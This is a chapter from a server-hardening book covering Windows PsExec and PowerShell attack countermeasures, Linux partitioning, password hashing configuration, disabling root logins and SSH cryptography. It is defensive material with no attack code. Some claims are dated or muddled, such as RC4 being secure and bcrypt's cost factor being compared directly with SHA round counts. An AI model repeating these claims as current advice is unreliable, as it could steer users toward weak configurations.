<h4 id="vps-identify-risks-lack-of-firewall">Lack of Firewall</h4>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-uncommon-veryeasy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Now this is addressed, because so many rely on firewalls to hide many weak areas of defence. The lack of a firewall if your services and communications between them are hardened does not have to be an issue, in-fact I see it as a goal many of us should have, as it forces us to build better layers of defence.</p>

<h3 id="vps-countermeasures">3. SSM Countermeasures</h3>

<p>Revisit the Countermeasures subsection of the first chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<p>The following resources are also worth reviewing:</p>

<ul>
  <li>MS Host Threats and Countermeasures:<br />
<a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007">https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007</a>
</li>
  <li>MS Securing Your Web Server: <a href="https://msdn.microsoft.com/en-us/library/ff648653.aspx">https://msdn.microsoft.com/en-us/library/ff648653.aspx</a> This is Microsoft specific, but does offer some insight into technology agnostic risks and countermeasures</li>
  <li>MS Securing Your Application Server: <a href="https://msdn.microsoft.com/en-us/library/ff648657.aspx">https://msdn.microsoft.com/en-us/library/ff648657.aspx</a> As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts</li>
</ul>

<h4 id="vps-countermeasures-forfeit-control-thus-security">Forfeit Control thus Security</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. How easy this will be is determined by how much you already have invested. Cloud offerings are often more expensive in monetary terms for medium to large environments, so as you grow, the cost benefits you may have gained due to quick development up-front will often become an anchor holding you back. Because you may have bought into their proprietary way of doing things, it now becomes costly to migrate, and your younger competitors which can turn quicker, out manoeuvre you. Platform as a Service and serverless technologies often appear even more attractive, but everything comes at a cost, cloud platforms may look good to start with, but often they are to good, and the costs will catch up with you. All that glitters is not gold.</p>

<h4 id="leanpub-auto-windows">Windows</h4>

<h5 id="vps-countermeasures-psexec-pth">PsExec and Pass The Hash (PTH)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Defence in depth will help here, the attacker should not be in possession of your admin passwords or hashes. If this has already happened, how did it happen? Take the necessary steps to make sure it does not happen again.</p>

<p>Samba is not usually installed on Linux by default, but as we are dealing with Windows here, you do not have the option of whether SMB is installed and running on your machines.</p>

<ul>
  <li>Port scan your target machines</li>
  <li>Close the SMB related ports 445 TCP, earlier OSs used 137, 138, 139</li>
  <li>Port scan again to verify</li>
  <li>Turn off public folder sharing</li>
</ul>

<p>Check the list of requirements for PsExec and turn of / disable what you can.</p>

<p>Try and re-exploit with the provided directions in the <a href="chap03.html#vps-identify-risks-psexec">Identify Risks</a> section.</p>

<p>Restrict administrative accounts as much as possible, especially network administrator accounts. All users should have the least amount of privilege necessary in order to do their jobs and elevate only when needed. This is why most Linux distributions use sudo.</p>

<p>Consider multi-factor authentication methods for administrators.</p>

<p>How exposed are administrators machines? Can they be put on a less exposed network segment? </p>

<p>In a Windows network, those that are the most likely to be exploited are administrators. Pay special attention to them and their machines. For example, if an attacker uses the <code>current_user_psexec</code> module, then once they have access to an administrators machine, traversal to other machines like Domain Controllers is trivial if the administrators current login context allows them to access the Domain Controller. Make sure the administrators are aware of this and that they only elevate privileges when it is required and not on their own machines.</p>

<p>Network Intrusion Detection Systems (<a href="chap04.html#network-countermeasures-lack-of-visibility-nids">NIDS</a>) will more than likely not be able to detect the actual passing of the administrators credentials to the target system, because that is how the legitimate SysInternals PsExec behaves, but what a NIDS can be configured to watch for is what happens when the attackers payload executes, for example, it is not normally legitimate behaviour for reverse shells to be sent over the network. Host Intrusion Detection Systems (<a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">HIDS</a>) can of course detect the presence of additional and modified files, although these are less commonly run on desktop computers.</p>

<h5 id="vps-countermeasures-powershell-exploitation-with-persistence">PowerShell Exploitation with Persistence</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Upgrade PowerShell to the latest version.</p>

<p>As above, <strong>NIDS can help</strong> here, Often these attacks do not leave any files on the disk. Next Generation AV products are slowly coming to the market, such as those that use machine learning. Most of the products I have seen so far are very expensive though, this should change in time.</p>

<p><strong>Deep Script Block Logging</strong> can be enabled from PowerShell v5 onwards. This option tells PowerShell to record the content of all script blocks that it processes, we rely heavily on script blocks with PowerShell attacks. Script Block Logging includes recording of dynamic code generation and provides insight into all the script-based activity on the system, including scripts that are encoded to evade anti-virus, and understanding of observation from human eyes. Applies to any application that hosts PowerShell engine, CLI, ISE.</p>

<p><a href="https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html">Script Block Logging records</a> and logs the original obfuscated (XOR, Base64, encryption, etc) script, transcripts, and de-obfuscated code.</p>

<p>Run gpedit.msc -&gt; opens Local Group Policy Editor -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell -&gt; Turn On PowerShell Script Block Logging -&gt; Check the Enabled box. By default, each script block is only logged the first time it is run. You can also check the Log script block invocation start / stop events check box if you want to log start and stop events for every time any script block is invoked. The second option can produce very large amounts of log events though.</p>

<p>This setting may also be accessible from the registry:</p>

<p>Set <code>EnableScriptBlockLogging = 1</code><br />
at<br />
<code>HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</code><br />
or<br />
<code>HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</code></p>

<h4 id="leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need">Minimise Attack Surface by Installing Only what you Need</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>I am hoping this goes without saying, unless you are setting up a Windows server with all the stuff that you have little control over its hardening process, which is why I favour UNIX based servers. I/You have all the control, if anything goes wrong, it will usually be our own fault for missing or neglecting something. The less you have on your servers, the fewer servers you have, the smaller the network you have, the less employees you have, basically the smaller and lesser of everything you have, the less there is to compromise by an attacker and the quicker you can move.</p>

<h4 id="vps-countermeasures-disable-remove-services-harden-what-is-left">Disable, Remove Services. Harden what is left</h4>

<p>Much of this section came from a web server I set-up, from install and through the hardening process.</p>

<p>There are often a few services you can disable even on a bare bones Debian install and some that are just easier to remove. Then go through the process of hardening what is left. Make sure you test before and after each service you disable, remove or harden, watch the port being opened/closed, etc. Remember, the less you have, the less there is to be exploited.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>By creating many partitions and applying the least privileges necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to.</p>

<p>This is a similar concept to tightly constraining input fields to only be able to accept structured data (names (alpha only), dates, social security numbers, zip codes, email addresses, etc) rather than just leaving the input wide open to be able to enter any text as discussed in the Web Applications chapter under <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation">What is Validation</a>.</p>

<p>The way Id usually set-up a web servers partitions is as follows. Delete all the current partitions and add the following. <code>/</code> was added to the start and the rest to the end, in the following order: <code>/</code>, <code>/var/log</code> (optional, but recommended), <code>/var/tmp</code> (optional, but recommended), <code>/var</code>, <code>/tmp</code>, <code>/opt</code>, <code>/usr/share</code> (optional, but recommended), <code>/usr</code>, <code>/home</code>, <code>swap</code>.</p>

<p>You will notice in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a> section, that I ended up adding additional partitions (mentioned in the previous paragraph) to apply finer grained control on directories often targeted by attackers. It is easier to add those partitions here, we will add options to them in the Lock Down section.</p>


<figure class="image center" style="width: 395px;">
  <img src="images/PartitioningDisk.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>If you add the optional, but recommended partitions, then they may look more like the following after a <code>df -h</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       <code class="m">4</code>.5G  453M  <code class="m">3</code>.8G  <code class="m">11</code>% /
/dev/sda8       <code class="m">6</code>.3G  297M  <code class="m">5</code>.7G   <code class="m">5</code>% /usr
tmpfs           247M     <code class="m">0</code>  247M   <code class="m">0</code>% /dev/shm
/dev/sda9        18G  134M   17G   <code class="m">1</code>% /home
/dev/sda7       <code class="m">3</code>.7G  <code class="m">7</code>.5M  <code class="m">3</code>.4G   <code class="m">1</code>% /opt
/dev/sda6       923M  <code class="m">1</code>.2M  859M   <code class="m">1</code>% /tmp
/dev/sda13      965M  340M  560M  <code class="m">38</code>% /usr/share
/dev/sda5       <code class="m">3</code>.4G  995M  <code class="m">2</code>.2G  <code class="m">32</code>% /var
/dev/sda11       95M  <code class="m">1</code>.6M   87M   <code class="m">2</code>% /var/tmp
/dev/sda12      186M   39M  134M  <code class="m">23</code>% /var/log
</pre></div>

</figure>

<p>The sizes should be set-up according to your needs. If you have plenty of RAM, make your <code>swap</code> small, if you have minimal RAM (barely (if) sufficient), you could double the RAM size for your <code>swap</code>. It is usually a good idea to think about what mount options you want to use for your specific directories. This may shape how you set-up your partitions. For example, you may want to have options <code>nosuid</code>,<code>noexec</code> on <code>/var</code> but you cant because there are shell scripts in <code>/var/lib/dpkg/info</code> so you could set-up four partitions. <code>/var</code> without <code>nosuid</code>,<code>noexec</code> and <code>/var/tmp</code>, <code>/var/log</code>, <code>/var/account</code> with <code>nosuid</code>,<code>noexec</code>. Look ahead to the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Mounting of Partitions</a> section for more details, or just wait until you get to it.</p>

<p>You can think about changing <code>/opt</code> (static data) to mount read-only in the future as another security measure if you like.</p>

<h5 id="leanpub-auto-apt-proxy-set-up">Apt Proxy Set-up</h5>

<p>If you want to:</p>

<ol class="numeric">
  <li>save on bandwidth</li>
  <li>Have a large number of your packages delivered at your network speed rather than your internet speed</li>
  <li>Have several Debian based machines on your network</li>
</ol>

<p>I recommend using apt-cacher-ng, installable with an <code>apt-get</code>, you will have to set this up on a server, by modifying the <code>/var/apt-cacher-ng/acng.conf</code> file to suite your environment. There is ample documentation. Then add the following file to each of your debian based machines.</p>

<p><code>/etc/apt/apt.conf</code> with the following contents and set its permissions to be the same as your sources.list:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># IP is the address of your apt-cacher server</code>
<code class="c1"># Port is the port that your apt-cacher is listening on, usually 3142</code>
Acquire::http::Proxy http://<code class="o">[</code>IP<code class="o">]</code>:<code class="o">[</code>Port<code class="o">]</code><code class="p">;</code>
</pre></div>

</figure>

<p>Now just replace the apt proxy references in the <code>/etc/apt/sources.list</code> of your consuming servers with the internet mirror you want to use, so we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.</p>

<p>Update the list of packages then upgrade them with the following command line. If you are using sudo, you will need to add that to each command:</p>

<figure class="code">
<div class="highlight"><pre><code></code>apt-get update <code class="o">&amp;&amp;</code> apt-get upgrade
<code class="c1"># Only run apt-get upgrade if apt-get update is successful (exits with a status of 0).</code>
</pre></div>

</figure>

<p>Now if youre working through an installation, youll be asked for a mirror to pull packages from. If you have the above apt caching server set-up on your network, this is a good time to make it work for you. Youll just need to enter the caching servers IP address and port.</p>

<aside>
  <p>The steps you take to harden your server(s) that will have many user accounts will be considerably different to this. Many of the steps I have gone through here will be insufficient for a server with many users. The hardening process is not a one time procedure. It ends when you decommission the server. Be prepared to stay on top of your defences. It is much harder to defend against attacks than it is to exploit a vulnerability.</p>

</aside>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies">Review Password Strategies</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>A lot of the following you will have to follow along with on your VPS in order to understand what I am saying.</p>

<p>Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks and hardware you anticipate that your attackers will use. I have provided additional details around which Key Derivation Functions are best suited to which types of hardware in the <a href="chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use">Which KDF to use</a> section within the Web Applications chapter.</p>

<p>In most cases you will <a href="http://www.tldp.org/HOWTO/Shadow-Password-HOWTO-2.html#ss2.2">want to</a> shadow your passwords. This should be the default in most, or all recent Linux distributions.</p>

<p>How do you know if you already have the Shadow Suite installed? If you have a <code>/etc/shadow</code> file, take a look at the file and you should see your user and any others with an encrypted value following it. There will be a reference to the password from the <code>/etc/passwd</code> file, stored as a single <code>X</code> (discussed below). If the Shadow Suite is not installed, then your passwords are probably stored in the <code>/etc/passwd</code> file.</p>

<p><a href="https://en.wikipedia.org/wiki/Crypt_(C)">Crypt</a>, crypt 3 or crypt(3) is the Unix C library function designed for password authentication. The following table shows which Operating Systems have support out of the box and with which hashing functions or key derivation functions are supported. We discuss this table in a moment, so dont worry just yet if you do not understand it all:</p>

<p></p>


<figure class="image center" style="width: 396px;">
  <img src="images/CryptSupportInOperatingSystems.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p></p>

<p>It may be worth looking at and modifying the <code>/etc/shadow</code> file. Consider changing the maximum password age and password warning period. Consult the man page for shadow for full details. Check that you are happy with which encryption algorithms are currently being used. The files you will need to look at are: <code>/etc/shadow</code> and <code>/etc/pam.d/common-password</code>. The man pages you will probably need to read in conjunction with each other are the following:</p>

<ul>
  <li>shadow</li>
  <li>pam.d</li>
  <li>crypt 3</li>
  <li>pam_unix</li>
</ul>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-default-number-of-rounds">Out of the box crypt (glibc) supports MD5, SHA-256 and SHA-512, I wouldnt bother looking at DES, and MD5 is common but weak. You can also use the blowfish cipher via the bcrypt KDF with a little more work (a few minutes). The default of SHA-512 (in debian) enables salted passwords. The SHA family of hashing functions are to fast for password hashing. Crypt applies key stretching to slow brute-force cracking attempts down. The default number of rounds <a href="https://access.redhat.com/articles/1519843">have not changed</a> in at least 9 years, so it is well worth modifying the number to keep up with hardware advancements. There are some <a href="chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot">details</a> to work out what the factor should be, provided by OWASP in the MembershipReboot section in the Web Applications chapter. The <a href="https://en.wikipedia.org/wiki/Passwd">default number of rounds</a> are as follows:</p>

<ul>
  <li>MD5: 1000 rounds</li>
  <li>Blowfish: 64 rounds</li>
  <li>SHA-[256, 512]: 5000 rounds</li>
</ul>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-owasp-advice">The OWASP advice says we should double the rounds every subsequent two years. So for the likes of SHA in 2007 having 5000 rounds, we should be looking at increasing this to <code>160000</code> in the year 2017, so if you are still with the default, you are a long way behind and it is time to do some serious key stretching.</p>


<figure class="image center" style="width: 395px;">
  <img src="images/KeyStretching.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>How can you tell which algorithm you are using, salt size, number of iterations for the computed password, etc? The <a href="http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES">crypt 3</a> man page explains it all. By default a Debian install will be using SHA-512 which is better than MD5 and the smaller SHA-256. Dont take my word for it though, just have a look at the <code>/etc/shadow</code> file. I explain the file format below.</p>

<p>Now by default I did not have a rounds option in my <code>/etc/pam.d/common-password</code> module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.</p>

<p>You can increase the <code>rounds</code> by overriding the default in <code>/etc/pam.d/common-passwowrd</code>. You override the default by adding the rounds field and the value you want to use, as seen below.</p>

<figure class="code">
  <figcaption>/etc/pam.d/common-passwowrd</figcaption>

<div class="highlight"><pre><code></code>password <code class="o">[</code><code class="nv">success</code><code class="o">=</code><code class="m">1</code> <code class="nv">default</code><code class="o">=</code>ignore<code class="o">]</code> pam_unix.so obscure sha512 <code class="nv">rounds</code><code class="o">=[</code>number of rounds<code class="o">]</code>
</pre></div>

</figure>

<p>Next time someone changes their password (providing the account is local), <code>[number of rounds]</code> number of <code>rounds</code> will be used.</p>

<p>I would suggest adding this and re creating your passwords now. Just before you do, it is usually a good idea to be logged in at an extra terminal and possibly a root terminal as well, until you are sure you can log in again. It just makes things easier if for what ever reason you can no longer log in at a new terminal. Now as your normal user run:</p>

<p>
  <code>passwd</code>
</p>

<p>providing your existing password then your new one twice. You should now be able to see your password in the <code>/etc/shadow</code> file with the added <code>rounds</code> parameter.</p>

<p>Also have a check in <code>/var/log/auth.log</code>. Reboot and check you can still log in as your normal user. If all good. Do the same with the root account.</p>

<p>Lets have a look at the <code>passwd</code> and <code>shadow</code> file formats.</p>

<p><code>:</code> is a separator in both <code>/etc/shadow</code> and <code>/etc/passwd</code> files:</p>

<figure class="code">
  <figcaption>/etc/shadow</figcaption>

<div class="highlight"><pre><code></code>you:<code class="nv">$id$rounds</code><code class="o">=</code>&lt;number of rounds, specified in /etc/pam.d/common-password&gt;$<code class="o">[</code>up to <code class="m">16</code> characte<code class="se">\</code>
r salt<code class="o">]</code>$<code class="o">[</code>computed password<code class="o">]</code>:&lt;rest of string&gt;
</pre></div>

</figure>

<ol class="numeric">
  <li>
<code>you</code> is the Account username</li>
  <li>
<code>$id$salt$hashedpassword</code> is generally considered to be called the encrypted password, although this is made up of three base fields separated by the <code>$</code>. The <code>id</code> can be any of the <em>Scheme id</em>s that crypt supports, as shown in the above table. How the rest of the substrings in this field are interpreted is <a href="http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES">determined</a> by what is found in the <code>id</code> field. The salt can be up to 16 characters. In saying that, the salt can be <a href="http://backreference.org/2014/04/19/many-ways-to-encrypt-passwords/">augmented</a> by prepending the <code>rounds=&lt;number of rounds, sourced from /etc/pam.d/common-password&gt;$</code> directive.</li>
</ol>

<p>The hashed part of the password string is the actual computed password. The size of this string is fixed as per the below table:</p>


<figure class="image center" style="width: 395px;">
  <img src="images/EncryptedPartOfCryptStringInShadowFile.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The rest of the fields are as per below.</p>

<figure class="code">
  <figcaption>/etc/shadow</figcaption>

<div class="highlight"><pre><code></code>daemon:*:15980:0:99999:7:::
</pre></div>

</figure>

<ol class="numeric">
  <li>
<code>daemon</code> is the account username</li>
  <li>
<code>*</code> is the place where the salt and hashed password would go, the asterisk means that this account can not be used to log in.</li>
  <li>
<code>15980</code> is the number of days from the Unix epoch (1970-1-1) to when the password was changed.</li>
  <li>
<code>0</code> is the minimum password age or number of days that the user will have to wait before they will be allowed to change their password. An empty field or <code>0</code> means that there is no minimum.</li>
  <li>
<code>99999</code> is the maximum number of days until the user will be forced to change their password. <code>99999</code> or an empty value means that there is no limit to the maximum age that the password should be changed. If the maximum password age is lower than the minimum password age (No. 4) the user can not change their password.</li>
  <li>
<code>7</code> is the password warning period. An empty value or <code>0</code> means that there is no warning period.</li>
  <li>The last three fields are:
    <ol class="numeric">
      <li>Password inactivity period, days before the account is made inactive</li>
      <li>Account expiration date, expressed in days since Unix epoch (1970-1-1)</li>
      <li>Reserved field, not currently used</li>
    </ol>
  </li>
</ol>

<p>The format of the <code>/etc/passwd</code> file is as follows:</p>

<figure class="code">
  <figcaption>/etc/passwd</figcaption>

<div class="highlight"><pre><code></code>root:x:0:0:root:/root:/bin/bash
you:x:1000:1000:you,,,:/home/you:/bin/bash
</pre></div>

</figure>

<ol class="numeric">
  <li>
<code>root</code> and <code>you</code> are the account usernames</li>
  <li>
<code>x</code> is the placeholder for password information. The password is obtained from the <code>/etc/shadow</code> file.</li>
  <li>
<code>0</code> or <code>1000</code> is the user Id, the root user always has an Id of <code>0</code>.</li>
  <li>The second <code>0</code> or <code>1000</code> is the primary group Id for the user, the root user always has a primary group Id of <code>0</code>.</li>
  <li>
<code>root</code> or <code>you,,,</code> is the comment field. This field can be used to describe the user or users function. This could be used for contact details, or maybe what the account is used for.</li>
  <li>
<code>/root</code> or <code>/home/you</code> is the users home directory. For regular users, this would usually be <code>/home/[you]</code>. For root, this is <code>/root</code>.</li>
  <li>
<code>/bin/bash</code> is the users default shell.</li>
</ol>

<h6 id="leanpub-auto-considerhttpslistsdebianorgdebian-user201104msg00550html-changing-to-bcrypt">
<a href="https://lists.debian.org/debian-user/2011/04/msg00550.html">Consider</a> changing to Bcrypt</h6>

<p>You should find this fairly straight forward on a Debian server. In order to <a href="https://serverfault.com/questions/10585/enable-blowfish-based-hash-support-for-crypt/11685">use bcrypt</a> with slowpoke blowfish which is the best (very slow) algorithm available for hashing passwords currently, which is obvious by the number of iterations applied by default as noted above, 64 rounds as opposed to <code>MD5</code>s 1000 rounds, and <code>SHA</code>s 5000 rounds from 2007.</p>

<ol class="numeric">
  <li>In Debian you need to install the package libpam-unix2</li>
  <li>Then you will have to edit the following files under <code>/etc/pam.d/</code>, and change all references to <code>pam_unix.so</code> to <code>pam_unix2.so</code> in the following files:</li>
</ol>

<ul>
  <li>common-account</li>
  <li>common-auth</li>
  <li>common-password, also while you are in this one, replace the current cipher (probably <code>sha512</code>) with <code>blowfish</code>
</li>
  <li>common-session</li>
</ul>

<p>Passwords that are updated after these modifications are made will be computed using blowfish. Existing shadow passwords are not modified until you change them. So you need to change them immediately (one at a time to start with please. Leave root till last) if you expect them to be using the bcrypt KDF. Do this the same way we did above with the <code>passwd</code> command.</p>

<p>Something to be aware of: If the version of libpam-unix2 that you just installed does not support the existing crypt scheme used to create an existing users password, that user may not be able to log in. You can get around this by having root create a new password for that user, because <code>passwd</code> will not ask root for that users existing password.</p>

<h6 id="leanpub-auto-password-grub">Password GRUB</h6>

<p>Consider setting a password for GRUB, especially if your server is directly on physical hardware. If it is on a hypervisor, an attacker has another layer to go through before they can access the guests boot screen.</p>

<h5 id="leanpub-auto-disable-root-logins-from-all-terminals">Disable Root Logins from All Terminals</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>There are a handful of files to <a href="https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-restrict-console-login">check and/or modify</a> in terms of disabling root logins.</p>

<ul>
  <li>
<code>/etc/pam.d/login</code><br />
This file along with the next one enables the <code>pam_securetty.so</code> module. When this file along with the next one is properly configured, when root tries to login on an insecure console (thats one that is not listed in the next file), they will not be prompted for a password and will instead receive a message like the following:<br />
<code>pam_securetty(login:auth): access denied: tty '/dev/tty1' is not secure :</code><br />
<code>Login incorrect</code><br />
Review and understand the contents of this file. There are plenty of comments, and read the <a href="http://linux.die.net/man/8/pam_securetty">pam_securetty</a> man page, which also refers to other applicable man pages. By default, you may not need to change anything in here. Do check and make sure that the following line, which provides the possibility to allow logins with null (blank) passwords, has the <code>nullok</code> text removed from it:<br />
<code>auth       required   pam_unix.so nullok</code><br />
I generally also like to make sure that the following line does not exist, as it allows root to log into the system from the local terminals listed in <code>/etc/inittab</code>. A better practise is to only allow low privilege users access to terminals and then elevate privileges once logged in:<br />
<code>auth     requisite  pam_securetty.so</code>  </li>
  <li>
<code>/etc/securetty</code><br />
Root access is allowed to all terminals listed in this file. Take a backup of this file, then modify by commenting out all of the consoles you dont need (preferably all of them), or better still, use the nothingness device to send (fill the file with) nothing<br />
<code>cat /dev/null &gt; /etc/securetty</code>  </li>
  <li>
<code>/etc/inittab</code><br />
This file contains a list of the virtual consoles / tty devices you have.  </li>
  <li>
<code>/etc/security/access.conf</code><br />
An <a href="https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-pam-rootaccess">alternative</a> to the previous method is to enable the <code>pam_access</code> module and make modifications to this file. Currently everything is commented out by default. Enabling this module and configuring it, allows for finer grained access control, but log messages are lacking. I usually dont touch this module.</li>
</ul>

<p>Now test that you are unable to log into any of the text terminals (TeleTYpewriter, tty) listed in <code>/etc/inittab</code>. Usually these can be accessed by [Ctrl]+[Alt]+[F[1, 2, 3, ]] if you are dealing with a physical machine. If you are dealing with a hypervisor, attempt to log-in to the guests console via the hypervisor management UI as root, in the case of VMware ESX(i) vSphere. You should no longer be able to.</p>

<p>Make sure that if your server is not physical hardware, but is a VM, then the hosts password is long and consists of a random mix of upper case, lower case, numbers, and special characters.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh">SSH</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>We covered fingerprinting of SSH under the Reconnaissance section of the Processes and Practises chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Here we will discuss:</p>

<ol class="numeric">
  <li>The underlying cyrpto-systems of SSH</li>
  <li>Determining the authenticity of the server that you are attempting to log in to</li>
  <li>What you can do to harden SSH</li>
</ol>

<p>First of all, make sure you are using SSH version 2. Version 1 and its progressions have well documented known vulnerabilities. Version 2 has none at the time of writing this. You can confirm this in multiple ways. The two simplest techniques are as follows:</p>

<ol class="numeric">
  <li>Check the <code>Protocol</code> field of <code>/etc/ssh/sshd_config</code> on your server, it should say <code>2</code>, as in <code>Protocol 2</code>
</li>
  <li>Try forcing the use of version 1 and you should be denied.<br />
<code>ssh -1 you@your_server</code><br />
# You should see the following:<br />
<code>Protocol major versions differ: 1 vs. 2</code><br />
# The following will force version 2<br />
<code>ssh -2 you@your_server</code>
</li>
</ol>

<h6 id="leanpub-auto-symmetric-cryptosystems">Symmetric Cryptosystems</h6>

<p>Often refereed to as secret key or shared secret encryption. In the case of Symmetrical encryption, typically only a single key is required for both ends of the communication, or a pair of keys in which a simple transformation is required to establish the relationship between them (not to be confused with how Diffie-Hellman (asymmetric) parties establish their secret keys). The single key should be kept secret by the parties involved in the conversation. This key can be used to both encrypt and decrypt messages.</p>

<p>Some of the commonly used and well known ciphers used for this purpose are the following:</p>

<ul>
  <li>AES (Advanced Encryption Standard block cipher with either key sizes of 128, 192 or 256 bits, considered highly secure, succeeded DES during the program National Institute of Standards Technology (NIST) began in 1997 for that purpose, which took five years. Approved in December 2001)</li>
  <li>3DES (block cipher variant of DES. Increases its security by increasing the key length)</li>
  <li>ARCFOUR (or RC4 is a stream cipher, used to be an unpatented trade-secret, until the source code was posted on-line anonymously, RC4 is very fast, but less studied than other algorithms. It is considered secure, providing the caveat of never reusing a key is observed.)</li>
  <li>CAST-128/256 (block cipher described in <a href="http://www.rfc-editor.org/rfc/rfc2144.txt">Request for Comments (RFC) 2144</a>, as a DES-like substitution-permutation crypto algorithm, designed in the early 1990s by Carlisle Adams and Stafford Tavares, available on a worldwide royalty-free basis)</li>
  <li>Blowfish (block cipher invented by Bruce Schneier in 1993, key lengths can vary from 32 to 448 bits. It is much faster than DES and IDEA, though not as fast as ARCFOUR. It has no patents and is intended to be free for all to use. Has received a fair amount of cryptanalytic scrutiny and has proved impervious to attack so far)</li>
  <li>Twofish (block cipher invented by Bruce Schneier, with the help from a few others, submitted in 1998 to the NIST as a candidate for the AES, to replace DES. It was one of the five finalists in the AES selection process out of 15 submissions. Twofish has no patents and is free for all uses. Key lengths can be 128, 192 or 256 bits. Twofish is also designed to be more flexible than Blowfish.)</li>
  <li>IDEA (Bruce Schneier in 1996 <a href="http://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm">pronounced</a> it the best and most secure block algorithm available to the public at this time. Omitted from SSH2 because it is patented and requires royalties for commercial use.)</li>
</ul>

<p>The algorithm selected to be used for encrypting the connection is decided by both the client and server, both must support the chosen cipher. Each is configured to work their way through a list from most preferred to least preferred. Entering <code>man ssh_config</code> into a terminal will show you the default order for your distribution.</p>

<h6 id="leanpub-auto-asymmetric-cryptosystems">Asymmetric Cryptosystems</h6>

<p>Also known as public-key or key-pair encryption, utilises a pair of keys, one which is public and one which by design is to be kept private. You will see where this is used below when we set-up the SSH connection. Below are the most commonly used public-key algorithms: </p>

<ul>
  <li>RSA (or Rivest-Shamir-Adleman is the most widely used asymmetric cipher and my preference at this point in time.). Was claimed to be patented by Public Key Partners, Inc (PKP). The algorithm is now in the public domain, and was added to SSH-2 not long after its patent expired.</li>
  <li>DH (Diffie-Hellman key agreement was the first public-key system published in open literature.) Invented in 1976 and patented in 1977, now expired and in the public domain. It allows two parties to derive a shared secret key (sounds similar to symmetric encryption, but it is not similar) securely over an open channel. <em>The parties engage in an exchange of messages, at the end of which they share a secret key. Its not feasible for an eavesdropper to determine the shared secret merely from observing the exchanged messages. SSH-2 uses the DH algorithm as its required (and currently, its only defined) key-exchange method.</em></li>
  <li>DSA (or Digital Signature Algorithm was developed by the the National Security Agency (NSA), but covered up by NIST first claiming that it had designed DSA.). Was originally the only key-exchange method for SSH-2</li>
  <li>ECDSA (or Elliptic Curve Digital Signature Algorithm), was accepted in 1999 as an ANSI standard, NIST and IEEE standards in 2000.</li>
</ul>

<h6 id="leanpub-auto-hashing">Hashing</h6>

<p>Also known as message digests and one-way encryption algorithms. Hash functions create a fixed-length hash value based on the plain-text. Hash functions are often used to determine the integrity of a file, message, or any other data.</p>

